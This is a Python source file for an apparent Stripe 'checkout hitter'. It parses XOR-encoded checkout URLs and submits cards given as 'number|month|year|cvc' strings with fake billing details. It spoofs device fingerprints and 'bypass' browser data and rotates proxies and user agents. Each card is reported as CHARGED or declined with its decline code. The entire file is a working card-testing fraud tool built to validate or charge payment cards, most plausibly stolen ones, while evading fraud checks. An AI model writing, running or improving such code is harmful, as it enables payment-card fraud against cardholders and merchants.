import requests
import json
import base64
import time
from urllib.parse import urlparse, parse_qs, urlencode
from fake_useragent import UserAgent
from config import Config
import re

class CheckoutService:
    def __init__(self):
        self.STRIPE_API = Config.STRIPE_API_BASE
        self.XOR_KEY = Config.XOR_KEY
        self.ua = UserAgent()

        # 3DS Configuration
        self.THREEDS_CONFIG = {
            'max_retries': Config.THREEDS_MAX_RETRIES,
            'retry_delay': Config.THREEDS_RETRY_DELAY,
            'timeout': Config.THREEDS_TIMEOUT
        }

        # User agents for rotation
        self.USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        ]

    def xor_decode(self, encoded):
        """XOR decode base64 encoded string"""
        try:
            decoded = base64.b64decode(encoded)
            result = bytearray()
            for byte in decoded:
                result.append(byte ^ self.XOR_KEY)
            return result.decode('utf-8')
        except:
            return encoded

    def generate_stripe_guid(self):
        """Generate Stripe GUID"""
        import uuid
        return str(uuid.uuid4())

    def generate_stripe_muid(self):
        """Generate Stripe MUID"""
        import random
        return ''.join(random.choice('0123456789abcdef') for _ in range(32))

    def parse_checkout_url(self, checkout_url):
        """Parse checkout URL to extract session ID and public key"""
        result = {'sessionId': None, 'publicKey': None, 'site': None}

        if not checkout_url:
            return result

        try:
            parsed_url = urlparse(checkout_url)

            # Extract session ID from URL path or fragment
            path_match = re.search(r'/pay/([^/?#]+)', parsed_url.path)
            if path_match:
                result['sessionId'] = path_match.group(1)

            # Extract from fragment (hash)
            if parsed_url.fragment:
                fragment_data = parse_qs(parsed_url.fragment)
                # Handle XOR encoded data
                if 'fid' in fragment_data:
                    try:
                        fid_data = self.xor_decode(fragment_data['fid'][0])
                        fid_parsed = json.loads(fid_data)
                        if 'key' in fid_parsed:
                            result['publicKey'] = fid_parsed['key']
                        if 'sessionId' in fid_parsed:
                            result['sessionId'] = fid_parsed['sessionId']
                    except:
                        pass

            # Extract site from URL
            if 'stripe.com' in checkout_url:
                result['site'] = 'stripe'
            elif 'replit.com' in checkout_url:
                result['site'] = 'replit'

        except Exception as e:
            print(f"Error parsing checkout URL: {e}")

        return result

    def make_request(self, url, data=None, options=None):
        """Make HTTP request with optional proxy support"""
        options = options or {}
        proxy = options.get('proxy')

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'Origin': 'https://checkout.stripe.com',
            'Referer': 'https://checkout.stripe.com/',
            'User-Agent': options.get('userAgent', self.USER_AGENTS[0])
        }

        headers.update(options.get('headers', {}))

        request_options = {
            'headers': headers,
            'timeout': options.get('timeout', 30000)
        }

        # Proxy support
        if proxy and proxy.get('host'):
            proxy_url = f"http://{proxy['host']}:{proxy['port']}"
            if proxy.get('user') and proxy.get('pass'):
                auth = f"{proxy['user']}:{proxy['pass']}"
                request_options['proxies'] = {
                    'http': f"http://{auth}@{proxy['host']}:{proxy['port']}",
                    'https': f"http://{auth}@{proxy['host']}:{proxy['port']}"
                }
            else:
                request_options['proxies'] = {
                    'http': proxy_url,
                    'https': proxy_url
                }

        try:
            if data:
                if isinstance(data, dict):
                    post_data = urlencode(data)
                else:
                    post_data = data

                response = requests.post(url, data=post_data, **request_options)
            else:
                response = requests.get(url, **request_options)

            return {
                'success': response.status_code == 200,
                'status': response.status_code,
                'data': response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text,
                'headers': dict(response.headers)
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'status': 0
            }

    def fetch_checkout_info(self, session_id, public_key, proxy=None):
        """Fetch checkout information from Stripe"""
        url = f"{self.STRIPE_API}/v1/payment_pages/{session_id}/init"

        data = {
            'key': public_key,
            'eid': 'NA',
            'browser_locale': ''
        }

        response = self.make_request(url, data, {'proxy': proxy})

        if not response['success']:
            return {
                'error': {
                    'message': response.get('error', 'Failed to fetch checkout info'),
                    'code': response.get('status', 0)
                }
            }

        return response['data']

    def parse_card_string(self, card_string):
        """Parse card string into components"""
        if not card_string or '|' not in card_string:
            return None

        parts = card_string.split('|')
        if len(parts) < 4:
            return None

        return {
            'number': parts[0].strip(),
            'exp_month': parts[1].strip(),
            'exp_year': parts[2].strip(),
            'cvc': parts[3].strip()
        }

    def create_payment_method(self, card, public_key, session_id, email, proxy=None):
        """Create Stripe payment method"""
        url = f"{self.STRIPE_API}/v1/payment_methods"

        data = {
            'type': 'card',
            'card[number]': card['number'],
            'card[cvc]': card['cvc'],
            'card[exp_month]': card['exp_month'],
            'card[exp_year]': card['exp_year'],
            'billing_details[name]': 'Test User',
            'billing_details[email]': email,
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': '1501 Gaylord Trail',
            'billing_details[address][city]': 'Grapevine',
            'billing_details[address][state]': 'TX',
            'billing_details[address][postal_code]': '76051',
            'guid': self.generate_stripe_guid(),
            'muid': self.generate_stripe_muid(),
            'sid': self.generate_stripe_guid(),
            'key': public_key,
            'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout'
        }

        response = self.make_request(url, data, {'proxy': proxy})

        if not response['success']:
            return {
                'error': {
                    'message': response.get('error', 'Failed to create payment method'),
                    'code': response.get('status', 0)
                }
            }

        return response['data']

    def confirm_payment(self, payment_method_id, session_id, public_key, expected_amount, init_checksum, proxy=None):
        """Confirm payment with Stripe"""
        url = f"{self.STRIPE_API}/v1/payment_pages/{session_id}/confirm"

        # Generate bypass browser data (simplified)
        browser_data = {
            "screen_width": 1920,
            "screen_height": 1080,
            "screen_color_depth": 24,
            "language": "en-US",
            "platform": "MacIntel",
            "timezone": "America/New_York",
            "cookies_enabled": True,
            "do_not_track": False
        }

        device_data_json = json.dumps(browser_data)
        device_data_b64 = base64.b64encode(device_data_json.encode()).decode()

        data = {
            'eid': 'NA',
            'payment_method': payment_method_id,
            'expected_amount': str(expected_amount),
            'expected_payment_method_type': 'card',
            'product_usage': 'checkout',
            'checkout': '1',
            'key': public_key,
            'device_data': device_data_b64
        }

        response = self.make_request(url, data, {'proxy': proxy})

        if not response['success']:
            return {
                'error': {
                    'message': response.get('error', 'Failed to confirm payment'),
                    'code': response.get('status', 0)
                }
            }

        return response['data']

    def get_amount_and_currency(self, checkout_info):
        """Extract amount and currency from checkout info"""
        try:
            amount = None
            currency = 'USD'

            # Check various possible locations for amount
            if checkout_info.get('amount'):
                amount = checkout_info['amount']
            elif checkout_info.get('invoice_data', {}).get('amount_due'):
                amount = checkout_info['invoice_data']['amount_due']
            elif checkout_info.get('subscription_data'):
                # Handle subscription/trial amounts
                if checkout_info['subscription_data'].get('items'):
                    for item in checkout_info['subscription_data']['items']:
                        if item.get('price', {}).get('unit_amount'):
                            amount = item['price']['unit_amount']
                            break

            # Get currency
            if checkout_info.get('currency'):
                currency = checkout_info['currency'].upper()
            elif checkout_info.get('invoice_data', {}).get('currency'):
                currency = checkout_info['invoice_data']['currency'].upper()

            # Extract business info
            business_url = None
            business_name = None

            if checkout_info.get('account_settings'):
                account = checkout_info['account_settings']
                business_url = account.get('business_url') or account.get('business_profile', {}).get('url')
                business_name = account.get('display_name') or account.get('business_name') or account.get('business_profile', {}).get('name')

            return {
                'amount': amount,
                'currency': currency,
                'businessUrl': business_url,
                'businessName': business_name
            }

        except Exception as e:
            print(f"Error extracting amount and currency: {e}")
            return {
                'amount': None,
                'currency': 'USD',
                'businessUrl': None,
                'businessName': None
            }

    def process_checkout(self, checkout_url, card_string, proxy=None):
        """Main checkout processing function"""
        try:
            print(f"[*] Processing checkout: {checkout_url[:50]}...")

            if proxy:
                print(f"[*] Using proxy: {proxy['host']}:{proxy['port']}")

            # Parse checkout URL
            parsed = self.parse_checkout_url(checkout_url)
            if not parsed['sessionId'] or not parsed['publicKey']:
                return {
                    'success': False,
                    'status': 'INVALID_URL',
                    'error': 'Could not parse checkout URL'
                }

            print(f"[*] Session: {parsed['sessionId']}")
            print(f"[*] Public Key: {parsed['publicKey'][:20]}...")

            # Parse card
            card = self.parse_card_string(card_string)
            print(f"[*] Card: ...{card['number'][-4:] if card else 'INVALID'}")

            if not card:
                return {
                    'success': False,
                    'status': 'INVALID_CARD',
                    'error': 'Invalid card format'
                }

            # Fetch checkout info
            info = self.fetch_checkout_info(parsed['sessionId'], parsed['publicKey'], proxy)

            if info.get('error'):
                return {
                    'success': False,
                    'status': 'FETCH_ERROR',
                    'error': info['error']['message']
                }

            # Extract checkout details
            checkout_details = self.get_amount_and_currency(info)
            amount = checkout_details['amount']
            currency = checkout_details['currency']
            email = info.get('customer_email', 'test@example.com')

            display_amount = amount / 100 if amount else 'unknown'
            print(f"[*] Amount: ${display_amount} {currency}")
            print(f"[*] Email: {email}")

            # Create payment method
            payment_method = self.create_payment_method(card, parsed['publicKey'], parsed['sessionId'], email, proxy)

            if payment_method.get('error'):
                return {
                    'success': False,
                    'status': 'PAYMENT_METHOD_ERROR',
                    'error': payment_method['error']['message']
                }

            payment_method_id = payment_method.get('id')
            if not payment_method_id:
                return {
                    'success': False,
                    'status': 'PAYMENT_METHOD_ERROR',
                    'error': 'No payment method ID received'
                }

            # Confirm payment
            confirmation = self.confirm_payment(payment_method_id, parsed['sessionId'], parsed['publicKey'], amount, None, proxy)

            if confirmation.get('error'):
                error_code = confirmation['error'].get('code', 'unknown_error')
                error_message = confirmation['error'].get('message', 'Payment failed')

                # Extract decline code if available
                decline_code = confirmation['error'].get('decline_code')
                if not decline_code and confirmation['error'].get('payment_intent'):
                    decline_code = confirmation['error']['payment_intent'].get('last_payment_error', {}).get('decline_code')

                return {
                    'success': False,
                    'status': error_code or 'DECLINED',
                    'error': error_message,
                    'decline_code': decline_code or error_code,
                    'card': card['number'],
                    'payment_method_id': payment_method_id
                }

            # Check if payment was successful
            status = confirmation.get('status')
            if status == 'succeeded' or status == 'paid':
                return {
                    'success': True,
                    'status': 'CHARGED',
                    'card': card['number'],
                    'amount': amount,
                    'currency': currency,
                    'email': email,
                    'business_name': checkout_details['businessName'],
                    'business_url': checkout_details['businessUrl']
                }

            # Payment not completed
            return {
                'success': False,
                'status': 'INCOMPLETE',
                'error': 'Payment not completed',
                'card': card['number']
            }

        except Exception as e:
            print(f"Checkout processing error: {e}")
            return {
                'success': False,
                'status': 'ERROR',
                'error': str(e)
            }